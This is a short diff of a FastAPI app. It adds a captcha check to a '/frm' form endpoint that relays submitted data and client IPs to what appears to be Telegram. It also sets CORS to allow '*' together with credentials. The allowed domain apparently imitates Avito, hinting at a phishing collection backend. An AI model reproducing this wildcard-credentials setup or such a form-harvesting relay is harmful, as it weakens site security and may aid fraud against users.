@@ -6,14 +6,14 @@ from fastapi.responses import FileResponse, RedirectResponse
 
 from dto import RequestModel
 from config import TG_MANAGER
-from utils import format
+from utils import format, captcha
 
 
 app = FastAPI()
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=['avitologstract.ru'],
+    allow_origins=['*', 'avitologstract.ru'],
     allow_credentials=True,
     allow_methods=["GET", "POST"],
     allow_headers=["*"],
@@ -42,6 +42,12 @@ async def pingg():
 
 @app.post("/frm")
 async def form(data: RequestModel, request: Request):
+    if not await captcha(request.client.host, data.token):
+        return {
+            "status": 404,
+            "message": "Captcha failed",
+        }
+
     status_code = await TG_MANAGER.send(
         await format(
             str(request.client.host),
